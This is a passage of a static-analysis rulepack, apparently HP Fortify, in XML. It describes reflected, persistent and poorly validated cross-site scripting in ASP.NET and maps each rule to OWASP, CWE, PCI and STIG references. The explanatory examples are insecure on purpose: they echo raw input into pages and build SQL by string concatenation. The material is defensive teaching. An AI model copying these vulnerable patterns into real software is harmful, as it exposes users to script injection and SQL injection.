4:</b> The following ASP.NET code segment shows the programmatic way to implement Example 3 above.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.TextBox Login;<br>protected System.Web.UI.WebControls.Label EmployeeID;<br>...<br>EmployeeID.Text = Login.Text;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Example 1 and 2, these examples operate correctly if <code>Login</code> contains only standard alphanumeric text. If <code>Login</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer?  The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks in order to lure victims into clicking a link. When the victims click the link, they unwittingly reflect the malicious content through the vulnerable web application and back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Examples 1 and 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Inter-Component Communication Cloud XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- As in Examples 3 and 4, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. ASP.NET Request Validation and WCF are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. In case of ASP.NET Request Validation, we also provide evidence for when validation is explicitly disabled. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5]  <em>Anti-Cross Site Scripting Library</em> MSDN<br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[13]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[22] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[24]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_cross_site_scripting_persistent</key>
    <internalKey>Input Validation and Representation/Cross-Site Scripting/Persistent</internalKey>
    <name>Cross-Site Scripting: Persistent</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><b>Example 1:</b> The following ASP.NET Web Form queries a database for an employee with a given employee ID and prints the name corresponding with the ID.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = name;<br>&lt;/script&gt;<br></pre><br><br>Where <code>EmployeeName</code> is a form control defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   ...<br>   &lt;asp:Label id="EmployeeName" runat="server"&gt;<br>   ...<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 2:</b> The following ASP.NET code segment is functionally equivalent to Example 1 above, but implements all of the form elements programmatically.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.Label EmployeeName;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = name;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>These code examples function correctly when the values of <code>name</code> are well-behaved, but they do nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br><b>Example 3:</b> The following ASP.NET Web Form reads an employee ID number from an HTTP request and displays it to the user.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>EmployeeID.Text = Login.Text;<br>...<br>&lt;/script&gt;<br></pre><br><br>Where <code>Login</code> and <code>EmployeeID</code> are form controls defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   &lt;asp:TextBox runat="server" id="Login"/&gt;<br>   ...<br>   &lt;asp:Label runat="server" id="EmployeeID"/&gt;<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 4:</b> The following ASP.NET code segment shows the programmatic way to implement Example 3 above.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.TextBox Login;<br>protected System.Web.UI.WebControls.Label EmployeeID;<br>...<br>EmployeeID.Text = Login.Text;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Example 1 and 2, these examples operate correctly if <code>Login</code> contains only standard alphanumeric text. If <code>Login</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer?  The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks in order to lure victims into clicking a link. When the victims click the link, they unwittingly reflect the malicious content through the vulnerable web application and back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Examples 1 and 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- As in Examples 3 and 4, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. ASP.NET Request Validation and WCF are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. In case of ASP.NET Request Validation, we also provide evidence for when validation is explicitly disabled. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5]  <em>Anti-Cross Site Scripting Library</em> MSDN<br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[13]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[22] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[24]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_cross_site_scripting_poor_validation</key>
    <internalKey>Input Validation and Representation/Cross-Site Scripting/Poor Validation</internalKey>
    <name>Cross-Site Scripting: Poor Validation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Relying on HTML, XML and other types of encoding to validate user input can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The use of certain encoding functions will prevent some, but not all cross-site scripting attacks. Depending on the context in which the data appear, characters beyond the basic &lt;, &gt;, &amp;, and " that are HTML-encoded and those beyond &lt;, &gt;, &amp;, ", and ' that are XML-encoded may take on meta-meaning. Relying on such encoding functions is equivalent to using a weak blacklist to prevent cross-site scripting and might allow an attacker to inject malicious code that will be executed in the browser. Because accurately identifying the context in which the data appear statically is not always possible, the HP Fortify Secure Coding Rulepacks report cross-site scripting findings even when encoding is applied and presents them as Cross-Site Scripting: Poor Validation issues.<br><br>Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><b>Example 1:</b> The following ASP.NET code segment reads an employee ID number from an HTTP request, HTML-encodes it, and displays it to the user.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>EmployeeID.Text = Server.HtmlEncode(Login.Text);<br>...<br>&lt;/script&gt;<br></pre><br><br>Where <code>Login</code> and <code>EmployeeID</code> are form controls defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   &lt;asp:TextBox runat="server" id="Login"/&gt;<br>   ...<br>   &lt;asp:Label runat="server" id="EmployeeID"/&gt;<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 2:</b> The following ASP.NET code segment implements the same functionality as in Example 1, albeit programmatically.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.TextBox Login;<br>protected System.Web.UI.WebControls.Label EmployeeID;<br>...<br>EmployeeID.Text = Server.HtmlEncode(Login.Text);<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>The code in these examples operate correctly if <code>Login</code> contains only standard alphanumeric text. If <code>Login</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer?  The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks in order to lure victims into clicking a link. When the victims click the link, they unwittingly reflect the malicious content through the vulnerable web application and back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br><b>Example 3:</b> The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the HTML-encoded name corresponding with the ID.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = Server.HtmlEncode(name);<br>&lt;/script&gt;<br></pre><br><br>Where <code>EmployeeName</code> is a form control defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   ...<br>   &lt;asp:Label id="EmployeeName" runat="server"&gt;<br>   ...<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 4:</b> Likewise, the following ASP.NET code segment is functionally equivalent to Example 3 above, but implements all of the form elements programmatically.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.Label EmployeeName;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = Server.HtmlEncode(name);<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Examples 1 and 2, these code segments perform correctly when the values of <code>name</code> are well-behaved, but they do nothing to prevent exploits if they are not. Again, these code examples can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Examples 1 and 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- As in Examples 3 and 4, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. ASP.NET Request Validation and WCF are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. In case of ASP.NET Request Validation, we also provide evidence for when validation is explicitly disabled. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5]  <em>Anti-Cross Site Scripting Library</em> MSDN<br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting, Content Spoofing</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692</em> <br></p>
																									   <p>[13]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[22]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_cross_site_scripting_reflected</key>
    <internalKey>Input Validation and Representation/Cross-Site Scripting/Reflected</internalKey>
    <name>Cross-Site Scripting: Reflected</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><b>Example 1:</b> The following ASP.NET Web Form reads an employee ID number from an HTTP request and displays it to the user.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>EmployeeID.Text = Login.Text;<br>...<br>&lt;/script&gt;<br></pre><br><br>Where <code>Login</code> and <code>EmployeeID</code> are form controls defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   &lt;asp:TextBox runat="server" id="Login"/&gt;<br>   ...<br>   &lt;asp:Label runat="server" id="EmployeeID"/&gt;<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 2:</b> The following ASP.NET code segment shows the programmatic way to implement Example 1 above.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.TextBox Login;<br>protected System.Web.UI.WebControls.Label EmployeeID;<br>...<br>EmployeeID.Text = Login.Text;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>The code in these examples operates correctly if <code>Login</code> contains only standard alphanumeric text. If <code>Login</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer?  The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks in order to lure victims into clicking a link. When the victims click the link, they unwittingly reflect the malicious content through the vulnerable web application and back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br><b>Example 3:</b> The following ASP.NET Web Form queries a database for an employee with a given employee ID and prints the name corresponding with the ID.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = name;<br>&lt;/script&gt;<br></pre><br><br>Where <code>EmployeeName</code> is a form control defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   ...<br>   &lt;asp:Label id="EmployeeName" runat="server"&gt;<br>   ...<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 4:</b> The following ASP.NET code segment is functionally equivalent to Example 3 above, but implements all of the form elements programmatically.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.Label EmployeeName;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = name;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Examples 1 and 2, these code examples function correctly when the values of <code>name</code> are well-behaved, but they nothing to prevent exploits if the values are not. Again, these can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious 